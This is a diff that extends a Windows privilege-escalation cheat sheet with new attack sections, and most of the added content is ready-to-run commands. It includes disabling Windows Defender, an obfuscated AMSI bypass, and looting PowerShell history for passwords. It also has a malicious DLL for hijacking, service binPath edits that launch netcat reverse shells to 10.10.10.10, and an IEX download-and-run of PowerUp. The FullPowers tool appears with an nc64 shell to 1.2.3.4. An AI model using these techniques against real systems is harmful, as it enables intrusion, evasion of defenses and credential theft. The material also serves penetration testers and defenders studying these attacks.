@@ -6,18 +6,35 @@
 * [Windows Version and Configuration](#windows-version-and-configuration)
 * [User Enumeration](#user-enumeration)
 * [Network Enumeration](#network-enumeration)
+* [Antivirus & Detections](#antivirus--detections)
+    * [Windows Defender](#windows-defender)
+    * [AppLocker Enumeration](#applocker-enumeration)
+    * [Powershell](#powershell)
+    * [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
+    * [SAM and SYSTEM files](#sam-and-system-files)
+    * [Search for file contents](#search-for-file-contents)
+    * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
+    * [Search the registry for key names and passwords](#search-the-registry-for-key-names-and-passwords)
+    * [Passwords in unattend.xml](#passwords-in-unattendxml)
+    * [Wifi passwords](#wifi-passwords)
+    * [Passwords stored in services](#passwords-stored-in-services)
+    * [Powershell history](#powershell-history)
 * [EoP - Processes Enumeration and Tasks](#eop---processes-enumeration-and-tasks)
 * [EoP - Incorrect permissions in services](#eop---incorrect-permissions-in-services)
 * [EoP - Windows Subsystem for Linux (WSL)](#eop---windows-subsystem-for-linux-wsl)
 * [EoP - Unquoted Service Paths](#eop---unquoted-service-paths)
+* [EoP - Named Pipes](#eop---named-pipes)
 * [EoP - Kernel Exploitation](#eop---kernel-exploitation)
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
+* [EoP - Evaluating Vulnerable Drivers](#eop---evaluating-vulnerable-drivers)
 * [EoP - Runas](#eop---runas)
+* [EoP - Abusing Shadow Copies](#eop---abusing-shadow-copies)
 * [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
 * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
 * [EoP - Impersonation Privileges](#eop---impersonation-privileges)
+  * [Restore A Service Account's Privileges](#restore-a-service-accounts-privileges)
   * [Meterpreter getsystem and alternatives](#meterpreter-getsystem-and-alternatives)
   * [RottenPotato (Token Impersonation)](#rottenpotato-token-impersonation)
   * [Juicy Potato (abusing the golden privileges)](#juicy-potato-abusing-the-golden-privileges)
@@ -28,6 +45,7 @@
   * [MS15-051 (Client Copy Image)](#ms15-051---microsoft-windows-2003--2008--7--8--2012)
   * [MS16-032](#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
   * [MS17-010 (Eternal Blue)](#ms17-010-eternal-blue)
+  * [CVE-2019-1388](#cve-2019-1388)
 * [References](#references)
 
 ## Tools
@@ -51,6 +69,11 @@
 - [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
 - [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
 - [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)
+    ```powershell
+    Seatbelt.exe -group=all -full
+    Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
+    Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
+    ```
 - [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
 - [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)
     ```powershell
@@ -102,6 +125,7 @@ List user privilege
 
 ```powershell
 whoami /priv
+whoami /groups
 ```
 
 List all users
@@ -207,6 +231,55 @@ SNMP Configuration
 ```powershell
 reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+```
+
+## Antivirus & Detections
+
+### Windows Defender
+
+```powershell
+# check status of Defender
+PS C:\> Get-MpComputerStatus
+
+# disable Real Time Monitoring
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+```
+
+### AppLocker Enumeration
+
+- With the GPO
+- HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
+
+List AppLocker rules
+
+```powershell
+PS C:\> $a = Get-ApplockerPolicy -effective
+PS C:\> $a.rulecollections
+```
+
+### Powershell
+
+Default powershell locations in a Windows system.
+
+```powershell
+C:\windows\syswow64\windowspowershell\v1.0\powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell
+```
+
+Example of AMSI Bypass.
+
+```powershell
+PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
+```
+
+
+### Default Writeable Folders
+
+```powershell
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\drivers\color
+C:\Windows\Tasks
+C:\windows\tracing
 ```
 
 ## EoP - Looting for passwords
@@ -381,6 +454,15 @@ Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 
+### Powershell history
+
+```powershell
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+cat (Get-PSReadlineOption).HistorySavePath
+cat (Get-PSReadlineOption).HistorySavePath | sls passw
+```
 
 ## EoP - Processes Enumeration and Tasks
 
@@ -391,6 +473,7 @@ tasklist /v
 net start
 sc query
 Get-Service
+Get-Process
 Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
 ```
 
@@ -447,6 +530,26 @@ dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 Often, services are pointing to writeable locations:
 - Orphaned installs, not installed anymore but still exist in startup
 - DLL Hijacking
+    ```powershell
+    # find missing DLL 
+    - Find-PathDLLHijack PowerUp.ps1
+    - Process Monitor : check for "Name Not Found"
+
+    # compile a malicious dll
+    - For x64 compile with: "x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+    - For x86 compile with: "i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll"
+
+    # content of windows_dll.c
+    #include <windows.h>
+    BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+        if (dwReason == DLL_PROCESS_ATTACH) {
+            system("cmd.exe /k whoami > C:\\Windows\\Temp\\dll.txt");
+            ExitProcess(0);
+        }
+        return TRUE;
+    }
+    ```
+
 - PATH directories with weak permissions
 
 ```powershell
@@ -468,7 +571,33 @@ Note to check file permissions you can use `cacls` and `icacls`
 
 You are looking for `BUILTIN\Users:(F)`(Full access), `BUILTIN\Users:(M)`(Modify access) or  `BUILTIN\Users:(W)`(Write-only access) in the output.
 
-### Example with Windows XP SP1
+### Example with Windows 10 - CVE-2019-1322 UsoSvc
+
+Prerequisite: Service account
+
+```powershell
+PS C:\Windows\system32> sc.exe stop UsoSvc
+PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+PS C:\Windows\system32> sc.exe start UsoSvc
+```
+
+### Example with Windows XP SP1 - upnphost
 
 ```powershell
 # NOTE: spaces are mandatory for this exploit to work !
@@ -548,13 +677,37 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
-Metasploit provides the exploit : `exploit/windows/local/trusted_service_path`
+* Metasploit exploit : `exploit/windows/local/trusted_service_path`
+* PowerUp exploit
+
+    ```powershell
+    # find the vulnerable application
+    C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
+
+    ...
+    [*] Checking for unquoted service paths...
+    ServiceName   : BBSvc
+    Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
+    StartName     : LocalSystem
+    AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
+    ...
+
+    # automatic exploit
+    Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
+    ```
 
 ### Example
 
 For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:
 - `C:\Program.exe`
 - `C:\Program Files.exe`
+
+## EoP - Named Pipes
+
+1. Find named pipes: `[System.IO.Directory]::GetFiles("\\.\pipe\")`
+2. Check named pipes DACL: `pipesec.exe <named_pipe>`
+3. Reverse engineering software
+4. Send data throught the named pipe : `program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\StdErrPipe`
 
 
 ## EoP - Kernel Exploitation
@@ -609,6 +762,39 @@ Application running as SYSTEM allowing an user to spawn a CMD, or browse directo
 
 Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
 
+## EoP - Evaluating Vulnerable Drivers
+Look for vuln drivers loaded, we often don't spend enough time looking at this:
+
+```powershell
+# https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
+
+PS C:\Users\Swissky> driverquery.exe /fo table
+Module Name  Display Name           Driver Type   Link Date
+============ ====================== ============= ======================
+1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM
+3ware        3ware                  Kernel        5/18/2015 6:28:03 PM
+ACPI         Microsoft ACPI Driver  Kernel        12/9/1975 6:17:08 AM
+AcpiDev      ACPI Devices driver    Kernel        12/7/1993 6:22:19 AM
+acpiex       Microsoft ACPIEx Drive Kernel        3/1/2087 8:53:50 AM
+acpipagr     ACPI Processor Aggrega Kernel        1/24/2081 8:36:36 AM
+AcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM
+acpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM
+ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
+<SNIP>
+
+PS C:\Users\Swissky> DriverQuery.exe --no-msft
+[+] Enumerating driver services...
+[+] Checking file signatures...
+Citrix USB Filter Driver
+    Service Name: ctxusbm
+    Path: C:\Windows\system32\DRIVERS\ctxusbm.sys
+    Version: 14.11.0.138
+    Creation Time (UTC): 17/05/2018 01:20:50
+    Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US
+    Signer: CN="Citrix Systems, Inc.", OU=XenApp(ClientSHA256), O="Citrix Systems, Inc.", L=Fort Lauderdale, S=Florida, C=US
+<SNIP>
+```
+
 ## EoP - Runas
 
 Use the `cmdkey` to list the stored credentials on the machine.
@@ -634,10 +820,25 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 ```
 
 ```powershell
-$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
-$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
-$ computer = "<hostname>"
+$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+```
+
+## EoP - Abusing Shadow Copies
+
+If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.
+
+```powershell
+# List shadow copies using vssadmin (Needs Admnistrator Access)
+vssadmin list shadows
+  
+# List shadow copies using diskshadow
+diskshadow list shadows all
+  
+# Make a symlink to the shadow copy and access it
+mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
 
 ## EoP - From local administrator to NT SYSTEM
@@ -666,6 +867,51 @@ Microsoft.Workflow.Compiler.exe tests.xml results.xml
 ```
 
 ## EoP - Impersonation Privileges
+
+Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.
+
+| Privilege | Impact | Tool | Execution path | Remarks |
+| --- | --- | --- | --- | --- |
+|`SeAssignPrimaryToken`| ***Admin*** | 3rd party tool | *"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"* | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
+|`SeBackup`| **Threat** | ***Built-in commands*** | Read sensitve files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter. |
+|`SeCreateToken`| ***Admin*** | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken`. ||
+|`SeDebug`| ***Admin*** | **PowerShell** | Duplicate the `lsass.exe` token.  | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |
+|`SeLoadDriver`| ***Admin*** | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
+|`SeRestore`| ***Admin*** | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
+|`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
+|`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||
+
+### Restore A Service Account's Privileges
+
+> This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.
+
+```powershell
+# https://github.com/itm4n/FullPowers
+
+c:\TOOLS>FullPowers
+[+] Started dummy thread with id 9976
+[+] Successfully created scheduled task.
+[+] Got new token! Privilege count: 7
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.19041.84]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= =======
+SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+SeAuditPrivilege              Generate security audits                  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+
+c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
+
 
 ### Meterpreter getsystem and alternatives
 
@@ -702,7 +948,7 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 ### Juicy Potato (abusing the golden privileges)
 
 Binary available at : https://github.com/ohpe/juicy-potato/releases    
-:warning: Juicy Potato doesn't work in Windows Server 2019. 
+:warning: Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +. 
 
 1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
 
@@ -842,6 +1088,20 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=threa
 python2 send_and_execute.py 10.0.0.1 revshell.exe
 ```
 
+### CVE-2019-1388
+
+Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html
+
+Working on :
+- Windows 7 
+- Windows 10 LTSC 10240
+
+Failing on : 
+- LTSC 2019
+- 1709
+- 1803
+
+Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege
 
 ## References
 
@@ -873,3 +1133,4 @@ python2 send_and_execute.py 10.0.0.1 revshell.exe
 * [Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @_xpn_](https://blog.xpnsec.com/becoming-system/)
 * [Living Off The Land Binaries and Scripts (and now also Libraries)](https://github.com/LOLBAS-Project/LOLBAS)
 * [Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec](https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html)
+* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
